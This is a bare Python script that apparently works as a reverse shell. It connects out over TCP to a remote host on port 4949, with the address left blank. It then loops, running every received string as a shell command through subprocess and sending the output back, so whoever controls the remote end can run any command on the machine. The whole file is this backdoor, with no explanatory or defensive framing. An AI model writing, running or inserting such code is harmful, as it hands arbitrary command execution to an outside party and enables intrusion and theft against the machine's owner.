import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

ip = ""
port = 4949

s.connect((ip, port))

while True:
    command = s.recv(4096).decode()

    if command == 'exit':
        s.close()
        break

    CMD = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    s.send(CMD.stdout)